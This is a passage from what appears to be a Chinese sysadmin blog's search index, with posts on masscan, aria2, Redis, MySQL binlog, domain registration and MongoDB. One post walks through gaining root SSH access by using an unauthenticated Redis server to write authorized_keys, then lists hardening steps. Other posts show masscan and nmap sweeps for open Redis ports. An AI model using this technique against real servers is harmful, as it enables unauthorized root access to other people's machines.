IP地址范围，有三种有效格式，1、单独的IPv4地址 2、类似&quot;10.0.0.1-10.0.0.233&quot;的范围地址 3、CIDR地址 类似于&quot;0.0.0.0/0&quot;，多个目标可以用都好隔开 -p &lt;ports,--ports &lt;ports&gt;&gt; 指定端口进行扫描 --banners 获取banner信息，支持少量的协议 --rate &lt;packets-per-second&gt; 指定发包的速率 -c &lt;filename&gt;, --conf &lt;filename&gt; 读取配置文件进行扫描 --echo 将当前的配置重定向到一个配置文件中 -e &lt;ifname&gt; , --adapter &lt;ifname&gt; 指定用来发包的网卡接口名称 --adapter-ip &lt;ip-address&gt; 指定发包的IP地址 --adapter-port &lt;port&gt; 指定发包的源端口 --adapter-mac &lt;mac-address&gt; 指定发包的源MAC地址 --router-mac &lt;mac address&gt; 指定网关的MAC地址 --exclude &lt;ip/range&gt; IP地址范围黑名单，防止masscan扫描 --excludefile &lt;filename&gt; 指定IP地址范围黑名单文件 --includefile，-iL &lt;filename&gt; 读取一个范围列表进行扫描 --ping 扫描应该包含ICMP回应请求 --append-output 以附加的形式输出到文件 --iflist 列出可用的网络接口，然后退出 --retries 发送重试的次数，以1秒为间隔 --nmap 打印与nmap兼容的相关信息 --http-user-agent &lt;user-agent&gt; 设置user-agent字段的值 --show [open,close] 告诉要显示的端口状态，默认是显示开放端口 --noshow [open,close] 禁用端口状态显示 --pcap &lt;filename&gt; 将接收到的数据包以libpcap格式存储 --regress 运行回归测试，测试扫描器是否正常运行 --ttl &lt;num&gt; 指定传出数据包的TTL值，默认为255 --wait &lt;seconds&gt; 指定发送完包之后的等待时间，默认为10秒 --offline 没有实际的发包，主要用来测试开销 -sL 不执行扫描，主要是生成一个随机地址列表 --readscan &lt;binary-files&gt; 读取从-oB生成的二进制文件，可以转化为XML或者JSON格式. --connection-timeout &lt;secs&gt; 抓取banners时指定保持TCP连接的最大秒数，默认是30秒。实例比如我扫描我自己的主机，设置发包速度为100000 root@centos:~# masscan 47.104.27.197/32 -p0-65535 -rate 100000 nmap(-rate): wat? randomization is our raison d&apos;etre!! rethink prease root@centos:~# masscan 47.104.27.197/32 -p0-65535 --rate 100000 Starting masscan 1.0.3 (http://bit.ly/14GZzcT) at 2017-12-28 04:41:32 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [65536 ports/host] Discovered open port 8080/tcp on 7.104.27.197 Discovered open port 65422/tcp on 7.104.27.197设置发包速度为 10000 root@centos:~# masscan 7.104.27.197/32 -p0-65535 --rate 10000 Starting masscan 1.0.3 (http://bit.ly/14GZzcT) at 2017-12-28 04:41:57 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [65536 ports/host] Discovered open port 7000/tcp on 7.104.27.197 Discovered open port 8080/tcp on 7.104.27.197 Discovered open port 65423/tcp on 7.104.27.197 Discovered open port 65422/tcp on 7.104.27.197 Discovered open port 443/tcp on 7.104.27.197 Discovered open port 80/tcp on 7.104.27.197其结果是不一样的，这个发包速度并不是越高越好。","categories":[],"tags":[{"name":"masscan","slug":"masscan","permalink":"https://awen.me/tags/masscan/"}]},{"title":"使用 aria2 满速下载百度网盘资源","slug":"使用-aria-满速下载百度网盘资源","date":"2017-12-27T05:28:16.000Z","updated":"2021-02-26T06:05:29.303Z","comments":true,"path":"posts/60593.html","link":"","permalink":"https://awen.me/posts/60593.html","excerpt":"安装brew install aria2","text":"安装brew install aria2 配置文件cd ~ mkdir .aria2 cd ~/.aria2 vim aria2.conf写入以下配置 #用户名 #rpc-user=user #密码 #rpc-passwd=passwd #上面的认证方式不建议使用,建议使用下面的token方式 #设置加密的密钥 #rpc-secret=token #允许rpc enable-rpc=true #允许所有来源, web界面跨域权限需要 rpc-allow-origin-all=true #允许外部访问，false的话只监听本地端口 rpc-listen-all=true #RPC端口, 仅当默认端口被占用时修改 #rpc-listen-port=6800 #最大同时下载数(任务数), 路由建议值: 3 max-concurrent-downloads=5 #断点续传 continue=true #同服务器连接数 max-connection-per-server=5 #最小文件分片大小, 下载线程数上限取决于能分出多少片, 对于小文件重要 min-split-size=10M #单文件最大线程数, 路由建议值: 5 split=10 #下载速度限制 max-overall-download-limit=0 #单文件速度限制 max-download-limit=0 #上传速度限制 max-overall-upload-limit=0 #单文件速度限制 max-upload-limit=0 #断开速度过慢的连接 #lowest-speed-limit=0 #验证用，需要1.16.1之后的release版本 #referer=* #文件保存路径, 默认为当前启动位置 dir=/Users/xxx/Downloads #文件缓存, 使用内置的文件缓存, 如果你不相信Linux内核文件缓存和磁盘内置缓存时使用, 需要1.16及以上版本 #disk-cache=0 #另一种Linux文件缓存方式, 使用前确保您使用的内核支持此选项, 需要1.15及以上版本(?) #enable-mmap=true #文件预分配, 能有效降低文件碎片, 提高磁盘性能. 缺点是预分配时间较长 #所需时间 none &lt; falloc ? trunc « prealloc, falloc和trunc需要文件系统和内核支持 file-allocation=prealloc其中 dir=/Users/xxx/Downloads xxx 替换成那的用户名 启动aria2c --conf-path=&quot;/Users/wenjun/.aria2/aria2.conf&quot; -D浏览器配置chrome 浏览器安装插件 YAAW for Chrome 百度网盘下载助手 https://github.com/acgotaku/BaiduExporter/releases 百度资源下载页面会出现这个选项 然后去查看下载进度 基本可以达到 4M 的样子。 之前用油泼猴的下载助手提前百度网盘的链接下载只能达到100kb mac 懒人版aria2 mac for gui 去这里下载 https://github.com/yangshun1029/aria2gui 自带图形界面","categories":[],"tags":[]},{"title":"查看远程服务器redis 版本","slug":"查看远程服务器redis-版本","date":"2017-12-27T02:54:49.000Z","updated":"2021-02-26T06:05:29.344Z","comments":true,"path":"posts/846.html","link":"","permalink":"https://awen.me/posts/846.html","excerpt":"未连接服务器，但是又想看redis 的版本 redis-cli -h 10.111.1.12 info详细信息","text":"未连接服务器，但是又想看redis 的版本 redis-cli -h 10.111.1.12 info详细信息 ubuntu@ubuntu-xenial:~$ redis-cli -h 10.111.1.12 info # Server redis_version:2.8.17 redis_git_sha1:00000000 redis_git_dirty:0 redis_build_id:4c1d5710660b9479 redis_mode:standalone os:Linux 3.16.0-4-amd64 x86_64 arch_bits:64 multiplexing_api:epoll gcc_version:4.9.2 process_id:1495 run_id:e2c28a160988b0b6257ded0c03db2e59cca671f7 tcp_port:6379 uptime_in_seconds:10801654 uptime_in_days:125 hz:10 lru_clock:4393672 config_file:/etc/redis/redis.conf # Clients connected_clients:11 client_longest_output_list:0 client_biggest_input_buf:0 blocked_clients:0 # Memory used_memory:818688 used_memory_human:799.50K used_memory_rss:4214784 used_memory_peak:19030032 used_memory_peak_human:18.15M used_memory_lua:191488 mem_fragmentation_ratio:5.15 mem_allocator:jemalloc-3.6.0 # Persistence loading:0 rdb_changes_since_last_save:2 rdb_bgsave_in_progress:0 rdb_last_save_time:1514303763 rdb_last_bgsave_status:err rdb_last_bgsave_time_sec:0 rdb_current_bgsave_time_sec:-1 aof_enabled:0 aof_rewrite_in_progress:0 aof_rewrite_scheduled:0 aof_last_rewrite_time_sec:-1 aof_current_rewrite_time_sec:-1 aof_last_bgrewrite_status:ok aof_last_write_status:ok # Stats total_connections_received:1197 total_commands_processed:441437 instantaneous_ops_per_sec:0 rejected_connections:0 sync_full:0 sync_partial_ok:0 sync_partial_err:0 expired_keys:0 evicted_keys:0 keyspace_hits:7404 keyspace_misses:3066 pubsub_channels:0 pubsub_patterns:0 latest_fork_usec:322 # Replication role:master connected_slaves:0 master_repl_offset:0 repl_backlog_active:0 repl_backlog_size:1048576 repl_backlog_first_byte_offset:0 repl_backlog_histlen:0 # CPU used_cpu_sys:6792.62 used_cpu_user:3648.58 used_cpu_sys_children:7.60 used_cpu_user_children:60.46 # Keyspace db0:keys=7,expires=0,avg_ttl=0","categories":[],"tags":[{"name":"redis","slug":"redis","permalink":"https://awen.me/tags/redis/"}]},{"title":"通过redis设置缺陷入侵系统","slug":"通过redis设置缺陷入侵系统","date":"2017-12-26T12:10:32.000Z","updated":"2021-02-26T06:05:29.359Z","comments":true,"path":"posts/32567.html","link":"","permalink":"https://awen.me/posts/32567.html","excerpt":"其实看标题，我为什么没有写漏洞，事实上它也确实算是个漏洞，不过我觉得还是人的因素比较大，因为如果安全意识足够强，肯定不可能让这个漏洞如愿以偿。就好比你家门不锁，然后东西被偷了，能怨谁啊！","text":"其实看标题，我为什么没有写漏洞，事实上它也确实算是个漏洞，不过我觉得还是人的因素比较大，因为如果安全意识足够强，肯定不可能让这个漏洞如愿以偿。就好比你家门不锁，然后东西被偷了，能怨谁啊！ 为什么会有这篇文章今天部门接到一个故障，说是它的一台测试服务器的代码被删了，调查发现是 redis 未设置密码导致的。其实这个漏洞在很早以前我就看到这个新闻了， 是 redis 权限设置不当导致暴露公网的机器被入侵。 漏洞演示演示此漏洞需满足以下几个要求： redis 使用默认端口； redis 使用公网访问 redis 使用root运行，并且ssh目录权限设置不当 redis 未设置密码 redis 使用的是 3.x 以下版本（吐槽:还用这么老的版本，是不是搞互联网的） 其实这每一条如果规避了都不可能被入侵成功，废话不多说，开始: 防火墙放行 iptables -A INPUT -p tcp --dport 6379 -j ACCEPT使用默认的配置文件运行服务端 ./redis-server ../redis.conf连接 redis 服务器 ubuntu@ubuntu-xenial:~/redis-2.8.17/src$ ./redis-cli -h 59.111.94.46 59.111.94.46:6379&gt;使用redis 命令切换到root目录下的ssh目录下 59.111.94.46:6379&gt; config set dir /root/.ssh/ OK利用 redis 的持久化特性将文件持久化到 authorized_keys 59.111.94.46:6379&gt; config set dbfilename authorized_keys OK并将准备好的公钥内容写入持久化文件 59.111.94.46:6379&gt; set xxx &quot;\\n\\n\\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDWuati70x2tsLBJ6FxDgK5NnRhUiIYMHEL9Nt0cwtOvlc8it7Ta9uSzQX6RV3hpF0Txg8/ARZaq75JyzN+1jsNh35mR49YWJloU8FbiI28IjdKAVvCOcAd/WWsPWrRIJPG38Z8Bu2xXBsNCmMwOtPd6VL4k9j6xmeA52PLe4wBJHZbGkPrbTxd7TTtvuWWmbx0dzvXBYCIalhVOJ7u5471tMBoCFGCYh5V8lzS0c4Hm3tf5SuQ8G3vWP8fLE6iUGen9rqBu+QNSxlYJSwz+O5T/ErFTFPZI3USQM7th1r6iY/Z8O7AzZlhXzPCHKcd/+8mzcEJ1JFU8m9gXgF6JwER ubuntu@ubuntu-xenial\\n\\n\\n&quot; OK 保存 59.111.94.46:6379&gt; save OK 59.111.94.46:6379&gt;远程登陆 ubuntu@ubuntu-xenial:~$ ssh root@59.111.94.46 The authenticity of host &apos;59.111.94.46 (59.111.94.46)&apos; can&apos;t be established. ECDSA key fingerprint is SHA256:ST9pjK2KmcxY+e7zJmu+ePtan7VbCx7rMmPpMEutc68. Are you sure you want to continue connecting (yes/no)? yes Warning: Permanently added &apos;59.111.94.46&apos; (ECDSA) to the list of known hosts. Last login: Tue Dec 26 20:17:39 2017 from 115.193.160.107 [root@centos ~]#查看文件 此时查看服务器对应的文件 [root@centos ~]# cat ~/.ssh/authorized_keys REDIS0006�xxxA� ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDWuati70x2tsLBJ6FxDgK5NnRhUiIYMHEL9Nt0cwtOvlc8it7Ta9uSzQX6RV3hpF0Txg8/ARZaq75JyzN+1jsNh35mR49YWJloU8FbiI28IjdKAVvCOcAd/WWsPWrRIJPG38Z8Bu2xXBsNCmMwOtPd6VL4k9j6xmeA52PLe4wBJHZbGkPrbTxd7TTtvuWWmbx0dzvXBYCIalhVOJ7u5471tMBoCFGCYh5V8lzS0c4Hm3tf5SuQ8G3vWP8fLE6iUGen9rqBu+QNSxlYJSwz+O5T/ErFTFPZI3USQM7th1r6iY/Z8O7AzZlhXzPCHKcd/+8mzcEJ1JFU8m9gXgF6JwER ubuntu@ubuntu-xenial ���?|��*[root@centos ~]#好了，模拟完成了。 如何规避方案: 1.禁止 redis 拥有外网直接访问的权限，特别是一些公有云上尽量使用 VPC 环境内网连接数据库，包含但不限于 redis 这一种数据库。2.禁止 root 远程登陆，使用普通用户登陆。3.不要用 root 运行 redis，使用低权限用户运行redis4.为 redis 设置密码，密码尽量设置长点，因为 redis 是直接写内存的，密码简单破解也很快的。 59.111.94.46:6379&gt; config get requirepass 1) &quot;requirepass&quot; 2) &quot;&quot; 59.111.94.46:6379&gt; config set requirepass &quot;password@#&quot; OK5.修改默认端口，包括 redis 和 SSH 的。 6.chattr +i ~/.ssh/authorized_keys &amp;&amp; chattr +i ~/.ssh 设置权限7.禁用 redis 高危命令，配置文件添加 rename-command FLUSHALL &quot;&quot; rename-command CONFIG &quot;&quot; rename-command EVAL &quot;&quot;8.尽快升级到最新版本 3.2以上版本， 默认开启了 protected 模式 protected-mode yes 就算没设置密码，该漏洞也无法切换到其他目录 ubuntu@ubuntu-xenial:~/redis-2.8.17/src$ ./redis-cli -h 59.111.94.46 59.111.94.46:6379&gt; ping PONG 59.111.94.46:6379&gt; 59.111.94.46:6379&gt; config set dir /root/.ssh/ (error) ERR Changing directory: Permission denied 写在最后现在很多公司都是用公有云环境，很多厂商都提供了 VPC 网络功能，可以利用起来，尽量避免业务相关的数据库，包括但不限于本篇所提到的 redis 直接暴露在公网并且使用默认配置，不做任何防护工作，软件权限管理混乱等，要定期升级以及关注厂商的更新和漏洞，及时打上补丁避免被入侵。 如何查找网段是否有 redis 运行nmap -sT -p 6379 10.111.0.0/16 | grep --color -B5 open Nmap scan report for 10.111.0.185 Host is up (0.049s latency). PORT STATE SERVICE 6379/tcp open unknown -- 6379/tcp filtered unknown Nmap scan report for 10.111.17.100 Host is up (0.049s latency). PORT STATE SERVICE 6379/tcp open unknown连接测试 fangwenjun@instance-1:~$ redis-cli -h 10.111.17.100 10.111.17.100:6379&gt; ping (error) DENIED Redis is running in protected mode because protected mode is enabled, no bind address was specified, no authentication password is requested to clients. In this mode connections are only accepted from the loopback interface. If you want to connect from external computers to Redis you may adopt one of the following solutions: 1) Just disable protected mode sending the command &apos;CONFIG SET protected-mode no&apos; from the loopback interface by connecting to Redis from the same host the server is running, however MAKE SURE Redis is not publicly accessible from internet if you do so. Use CONFIG REWRITE to make this change permanent. 2) Alternatively you can just disable the protected mode by editing the Redis configuration file, and setting the protected mode option to &apos;no&apos;, and then restarting the server. 3) If you started the server manually just for testing, restart it with the &apos;--protected-mode no&apos; option. 4) Setup a bind address or an authentication password. NOTE: You only need to do one of the above things in order for the server to start accepting connections from the outside. 10.111.17.100:6379&gt;如果是这样的说明没有权限","categories":[],"tags":[{"name":"redis","slug":"redis","permalink":"https://awen.me/tags/redis/"}]},{"title":"mysql 生成uuid","slug":"mysql-生成uuid","date":"2017-12-26T02:24:44.000Z","updated":"2021-02-26T06:05:29.280Z","comments":true,"path":"posts/40382.html","link":"","permalink":"https://awen.me/posts/40382.html","excerpt":"","text":"MySQL UUID() 函数1.查看当前mysql 版本 mysql&gt; show variables like &apos;%version%&apos;; +-------------------------+------------------------------+ | Variable_name | Value | +-------------------------+------------------------------+ | innodb_version | 5.7.20 | | protocol_version | 10 | | slave_type_conversions | | | tls_version | TLSv1,TLSv1.1 | | version | 5.7.20-log | | version_comment | MySQL Community Server (GPL) | | version_compile_machine | x86_64 | | version_compile_os | Linux | +-------------------------+------------------------------+ 8 rows in set (0.00 sec)2.使用 UUID() 创建一个随机的36位数，其中 UUID 本身是32位的，因为 MySQL 生成的 UUID 有四个中划线，所以在 utf8 字符集里，长度为 36 位。可以看到，两次调用uuid 获得的值是不一样的 mysql&gt; SELECT UUID(),UUID(),LENGTH(UUID()),CHAR_LENGTH(UUID()) \\G *************************** 1. row *************************** UUID(): 8bb7b1a9-e9e3-11e7-aa91-fa163e4d93c3 UUID(): 8bb7b1bb-e9e3-11e7-aa91-fa163e4d93c3 LENGTH(UUID()): 36 CHAR_LENGTH(UUID()): 36 1 row in set (0.00 sec)","categories":[],"tags":[]},{"title":"mysql binlog相关命令","slug":"mysql-binlog相关命令","date":"2017-12-25T07:26:25.000Z","updated":"2021-02-26T06:05:29.279Z","comments":true,"path":"posts/28122.html","link":"","permalink":"https://awen.me/posts/28122.html","excerpt":"以myslq 5.7为例 开启bin-loglog-bin=mysql-bin server-id=11.查看状态","text":"以myslq 5.7为例 开启bin-loglog-bin=mysql-bin server-id=11.查看状态 mysql&gt; show variables like &apos;log_%&apos;; +----------------------------------------+--------------------------------+ | Variable_name | Value | +----------------------------------------+--------------------------------+ | log_bin | ON | | log_bin_basename | /var/lib/mysql/mysql-bin | | log_bin_index | /var/lib/mysql/mysql-bin.index | | log_bin_trust_function_creators | OFF | | log_bin_use_v1_row_events | OFF | | log_builtin_as_identified_by_password | OFF | | log_error | /var/log/mysqld.log | | log_error_verbosity | 3 | | log_output | FILE | | log_queries_not_using_indexes | OFF | | log_slave_updates | OFF | | log_slow_admin_statements | OFF | | log_slow_slave_statements | OFF | | log_statements_unsafe_for_binlog | ON | | log_syslog | OFF | | log_syslog_facility | daemon | | log_syslog_include_pid | ON | | log_syslog_tag | | | log_throttle_queries_not_using_indexes | 0 | | log_timestamps | UTC | | log_warnings | 2 | +----------------------------------------+--------------------------------+ 21 rows in set (0.01 sec)binlog 操作1.创建一个数据库 mysql&gt; create database wordpress; Query OK, 1 row affected (0.01 sec)2.查看binlog 日志 [root@centos ~]# mysqlbinlog /var/lib/mysql/mysql-bin.000001 /*!50530 SET @@SESSION.PSEUDO_SLAVE_MODE=1*/; /*!50003 SET @OLD_COMPLETION_TYPE=@@COMPLETION_TYPE,COMPLETION_TYPE=0*/; DELIMITER /*!*/; ………… #171225 15:29:14 server id 1 end_log_pos 328 CRC32 0x9be9c989 Query thread_id=7 exec_time=0 error_code=0@@session.character_set_client=33,@@session.collation_connection=33,@@session.collation_server=8/*!*/; SET @@session.lc_time_names=0/*!*/; SET @@session.collation_database=DEFAULT/*!*/; create database wordpress /*!*/; SET @@SESSION.GTID_NEXT= &apos;AUTOMATIC&apos; /* added by mysqlbinlog */ /*!*/; DELIMITER ; # End of log file /*!50003 SET COMPLETION_TYPE=@OLD_COMPLETION_TYPE*/; /*!50530 SET @@SESSION.PSEUDO_SLAVE_MODE=0*/; binlog是二进制文件，普通文件查看器cat more vi等都无法打开，必须使用自带的 mysqlbinlog 命令查看 binlog日志与数据库文件在同目录中 注: server id 1 数据库主机的服务号； end_log_pos 328 pos点 thread_id=7 线程号 3.上面这种办法读取出binlog日志的全文内容较多，不容易分辨查看pos点信息，这里介绍一种更为方便的查询命令： mysql&gt; show binlog events [IN &apos;log_name&apos;] [FROM pos] [LIMIT [offset,] row_count]; 选项解析： IN ‘log_name’ 指定要查询的binlog文件名(不指定就是第一个binlog文件) FROM pos 指定从哪个pos起始点开始查起(不指定就是从整个文件首个pos点开始算) LIMIT [offset,] 偏移量(不指定就是0) row_count 查询总条数(不指定就是所有行) mysql&gt; show binlog events IN &apos;mysql-bin.000001&apos; -&gt; ; +------------------+-----+----------------+-----------+-------------+---------------------------------------+ | Log_name | Pos | Event_type | Server_id | End_log_pos | Info | +------------------+-----+----------------+-----------+-------------+---------------------------------------+ | mysql-bin.000001 | 4 | Format_desc | 1 | 123 | Server ver: 5.7.20-log, Binlog ver: 4 | | mysql-bin.000001 | 123 | Previous_gtids | 1 | 154 | | | mysql-bin.000001 | 154 | Anonymous_Gtid | 1 | 219 | SET @@SESSION.GTID_NEXT= &apos;ANONYMOUS&apos; | | mysql-bin.000001 | 219 | Query | 1 | 328 | create database wordpress | +------------------+-----+----------------+-----------+-------------+---------------------------------------+ 4 rows in set (0.00 sec) mysql&gt; show binlog events IN &apos;mysql-bin.000001&apos;\\G; *************************** 1. row *************************** Log_name: mysql-bin.000001 Pos: 4 Event_type: Format_desc Server_id: 1 End_log_pos: 123 Info: Server ver: 5.7.20-log, Binlog ver: 4 *************************** 2. row *************************** Log_name: mysql-bin.000001 Pos: 123 Event_type: Previous_gtids Server_id: 1 End_log_pos: 154 Info: *************************** 3. row *************************** Log_name: mysql-bin.000001 Pos: 154 Event_type: Anonymous_Gtid Server_id: 1 End_log_pos: 219 Info: SET @@SESSION.GTID_NEXT= &apos;ANONYMOUS&apos; *************************** 4. row *************************** Log_name: mysql-bin.000001 Pos: 219 Event_type: Query Server_id: 1 End_log_pos: 328 Info: create database wordpress 4 rows in set (0.00 sec) ERROR: No query specified查询第一个（最早）的binlog 日志 mysql&gt; show binlog events\\G; *************************** 1. row *************************** Log_name: mysql-bin.000001 Pos: 4 Event_type: Format_desc Server_id: 1 End_log_pos: 123 Info: Server ver: 5.7.20-log, Binlog ver: 4 *************************** 2. row *************************** Log_name: mysql-bin.000001 Pos: 123 Event_type: Previous_gtids Server_id: 1 End_log_pos: 154 Info: *************************** 3. row *************************** Log_name: mysql-bin.000001 Pos: 154 Event_type: Anonymous_Gtid Server_id: 1 End_log_pos: 219 Info: SET @@SESSION.GTID_NEXT= &apos;ANONYMOUS&apos; *************************** 4. row *************************** Log_name: mysql-bin.000001 Pos: 219 Event_type: Query Server_id: 1 End_log_pos: 328 Info: create database wordpress 4 rows in set (0.00 sec) ERROR: No query specified指定pos点查询 mysql&gt; show binlog events in &apos;mysql-bin.000001&apos; from 219 -&gt; ; +------------------+-----+------------+-----------+-------------+---------------------------+ | Log_name | Pos | Event_type | Server_id | End_log_pos | Info | +------------------+-----+------------+-----------+-------------+---------------------------+ | mysql-bin.000001 | 219 | Query | 1 | 328 | create database wordpress | +------------------+-----+------------+-----------+-------------+---------------------------+ 1 row in set (0.00 sec)从指定pos 查询10条 mysql&gt; show binlog events in &apos;mysql-bin.000001&apos; from 219 limit 10\\G; *************************** 1. row *************************** Log_name: mysql-bin.000001 Pos: 219 Event_type: Query Server_id: 1 End_log_pos: 328 Info: create database wordpress 1 row in set (0.00 sec) ERROR: No query specified恢复相关命令mysqlbinlog --stop-position=154 --database=wordpress mysql-bin.000002 | mysql -uroot -ppasswd -v wordpress 常用选项： –start-position=953 起始pos点 –stop-position=1437 结束pos点 –start-datetime=”2013-11-29 13:18:54” 起始时间点 –stop-datetime=”2013-11-29 13:21:53” 结束时间点 –database=zyyshop 指定只恢复zyyshop数据库(一台主机上往往有多个数据库，只限本地log日志) 不常用选项： -u –user=name Connect to the remote server as username.连接到远程主机的用户名 -p –password[=name] Password to connect to remote server.连接到远程主机的密码 -h –host=name Get the binlog from server.从远程主机上获取binlog日志 –read-from-remote-server Read binary logs from a MySQL server.从某个MySQL服务器上读取binlog日志","categories":[],"tags":[{"name":"mysql","slug":"mysql","permalink":"https://awen.me/tags/mysql/"}]},{"title":"关于域名备案","slug":"关于域名备案","date":"2017-12-24T11:00:12.000Z","updated":"2021-02-26T06:05:29.314Z","comments":true,"path":"posts/47574.html","link":"","permalink":"https://awen.me/posts/47574.html","excerpt":"今天，我们来聊一聊域名备案的问题 本文主要给各位普及一下域名备案是什么？为什么需要域名备案以及如何备案？备案后对你有何影响？","text":"今天，我们来聊一聊域名备案的问题 本文主要给各位普及一下域名备案是什么？为什么需要域名备案以及如何备案？备案后对你有何影响？ 首先，你要知道域名备案这个事情只在我天朝上国有，在其他国家是不存在的。假设你在国外买了一个域名并且在国外买了一个虚拟主机或服务器建站，是可以直接将域名解析到国外的 IP 地址去访问的。通常这边操作最快在几分钟内完成；但是如果在国内速度就不敢保证了(如果你在国外访问是非常快的)，并且随时有可能被隔离在长城防火墙之外，比如现在大部分在使用 linde 的服务器作为 web 服务的就基本已经阵亡了差不多了，甚至连远程 SSH 操作服务器都变得非常困难；你忍受不了速度，想在国内购买服务器搭建网站，比如在阿里云、网易云、腾讯云购买服务器使用，或者说你的服务器只要在中国，只要你的服务器的需要对外提供web服务，就必须首先通过备案后才可以提供服务。 那么为什么你在国外买的服务器跑个网站国内访问就这么慢呢？ 这个要分两个方面讲了，第一个是物理上的，由于服务器在国外，从你的电脑访问到国外的服务器这中间要经历层层的路由，需要消耗很多的带宽，因此会比较慢；第二个是由于墙的存在会干扰国外一些 VPS 厂商的 IP 地址段导致请求慢或无法发送请求到目标 IP 而造成的延迟大。 备案备的是什么？只要你的 IP 地址在国内，希望通过域名对外提供 web 访问就需要备案，否则无法访问。假设你的域名是www.caonima.com, 公网 IP 地址是12.13.42.4，服务器搭建了个 Apache web 服务器，对外的端口是 http 的默认端口80，那么 如果不备案，通常会被你的服务器提供商的防火墙拦截80端口的流量导致你无法正常访问。服务器会有一个白名单机制，只有你的域名备案有备案号才放行，否则拦截。当然除了80端口会被拦截，8080这种 web 常用端口也会被拦截。而443端口目前不会被拦截，因此如果你不希望备案又想使用 web 服务让网站支持 https 是个不错的选择。 哪些域名可以备案，哪些域名不可以备案只有天朝审批的域名后缀才可以备案，参考 (http://域名.信息)[http://域名.信息]。例如 .cc 这种顶级域名就不支持备案。 为什么要备案那么为什么需要备案？很简单，就是赵老爷希望在你发布了不利用党国的言论或非法信息（例如色情）等天朝法律不允许的内容时，能够第一时间拿到你的信息抓你或者要求你删除不当言论。 如何备案？既然你已经无法忍受国外服务的速度转投国内的云厂商，我这里就简单把备案步骤说一下： 首先，第一步，把你国外的域名转移到国内的域名厂商后然后进行后续的操作，这里我建议转移到一些比较大的域名厂商，或者你希望使用哪家的云服务器，那么就把域名转移过去，通常我是建议找一些大厂，稳定性和售后有保障点。比如阿里云 腾讯云，至少倒闭的可能性小，转移前先咨询对应厂商的售后了解转移手续。有可能他们的流程或要求会变。比如阿里云就要求域名必须在阿里，而且必须要有一台云服务器才可以开始备案 其次，备案需要提交很多的资料，要提前准备好，如果你选择了大厂，比如阿里云，会提供在线提交信息的通道，按照步骤来即可，通常提交完信息等待20几天就可以了，不过在备案期间是不能访问你的网站的，所以要做好心理准备。 最后，我还是建议，能不备案就不备案！国外自由，如果你只是一个博客性质的网站，真没必要，我们对比下: 备案有何影响国内: 需要提供非常多的信息，比如你的身份证信息、住址、联系方式等等。云服务商要一份，工信部要一份，甚至公安部还要一份。注册国内网站基本恨不得把你个人信息挖个遍，因为他们也怕担责任，如果你找个很小的云厂商注册域名（可能是某个大域名厂商的二级、三级代理）你的售后、你的信息泄露等等都无法保障。其次，万一你做的服务发生了违法信息（并非你上传）你也是要承担责任的，并且还有可能域名被收回。自己去搜相关案例。因此对隐私注重比较强的建议慎重选择。除非你是要在国内经营，那是没办法。 国内备案还有一个比较坑的就是假设你在阿里云备案了，那么如果你用阿里云用的不爽想迁移到其他厂商，你的备案是不被承认的，还需要重新备案才可以。 国外:大部分域名或云服务器厂商只需要一个邮箱、一个信用卡就可以了，并且无需备案。不过也是建议在一些信誉和售后比较好的厂商购买。比如域名我是在狗爹买的，服务器根据实际情况选了，大部分国外服务器的配置和性价比都比国内高很多。 不过，目前一些云厂商基本都是对 HTTP 协议进行限制，也就是说你如果使用除 80 以外的端口提供服务就管的不怎么严了，比如使用 HTTPS 有些云厂商就可以，以网易云为例： 使用 HTTP 协议访问未备案域名会被拦截 使用 HTTPS 访问未备案域名则正常 其原理是因为 HTTP 协议在传输国产中都是明文的，你的数据完全是公开的，那么防火墙可以通过 HTTP 协议的 Host 字段拿到你的域名进行判断，而 HTTPS 则是加密了内容，没有私钥是无法解密的。因此无法直接拦截，当然了也不是说不可以拦截，你想想谷歌、Youtube、twitter 你就知道了，只不过直接禁止 IP 或禁止端口可能影响很大吧，具体不清楚。 目前的网络环境来看，不管有无备案都应该开启 HTTPS。","categories":[],"tags":[]},{"title":"mysql gtid_mode ERROR 1786","slug":"mysql-gtid-mode-ERROR-1786","date":"2017-12-21T08:02:35.000Z","updated":"2021-02-26T06:05:29.279Z","comments":true,"path":"posts/39953.html","link":"","permalink":"https://awen.me/posts/39953.html","excerpt":"在 mysql 5.7 执行 create table a1 select * from event; 执行失败，失败原因：ERROR 1786 (HY000): Statement violates GTID consistency: CREATE TABLE ... SELECT.","text":"在 mysql 5.7 执行 create table a1 select * from event; 执行失败，失败原因：ERROR 1786 (HY000): Statement violates GTID consistency: CREATE TABLE ... SELECT. 查看状态 mysql&gt; show variables like &apos;%gtid_mode%&apos;; +---------------+-------+ | Variable_name | Value | +---------------+-------+ | gtid_mode | ON | +---------------+-------+ 1 row in set (0.01 sec)查了下官方是不建议这种复制，点击这里查看文档 CREATE TABLE … SELECT语句。 CREATE TABLE … SELECT对于基于语句的复制是不安全的。在使用基于行的复制时，该语句实际上被记录为两个单独的事件 - 一个用于创建表，另一个用于将源表中的行插入刚刚创建的新表中。当这个语句在一个事务中被执行时，这些事件在某些情况下可能会被接收到相同的事务标识符，这意味着包含插入事务的事务被从机跳过。因此，CREATE TABLE … SELECT在使用基于GTID的复制时不受支持。","categories":[],"tags":[{"name":"mysql","slug":"mysql","permalink":"https://awen.me/tags/mysql/"}]},{"title":"解决zsh 特别卡的问题","slug":"解决zsh-特别卡的问题","date":"2017-12-20T12:07:48.000Z","updated":"2021-02-26T06:05:29.356Z","comments":true,"path":"posts/43563.html","link":"","permalink":"https://awen.me/posts/43563.html","excerpt":"","text":"在 mac 上用 zsh 已经很久了，每次打开 zsh 都是无比的卡，有时候都卡好久才出来,短则四五秒，长的话一分钟左右。因此谷歌搜索了很多解决办法都不奏效。后来我找到了一个终极解决办法，希望对你有帮助 解决办法卸载 zsh 更换 fish","categories":[],"tags":[{"name":"zsh","slug":"zsh","permalink":"https://awen.me/tags/zsh/"}]},{"title":"mongodb 基础","slug":"mongodb-基础","date":"2017-12-20T09:33:05.000Z","updated":"2021-02-26T06:05:29.279Z","comments":true,"path":"posts/26900.html","link":"","permalink":"https://awen.me/posts/26900.html","excerpt":"安装[root@node-1 ~]# cat /etc/yum.repos.d/mongodb-org-3.6.repo [mongodb-org-3.6] name=MongoDB Repository baseurl=https://repo.mongodb.org/yum/redhat/$releasever/mongodb-org/3.6/x86_64/ gpgcheck=1 enabled=1 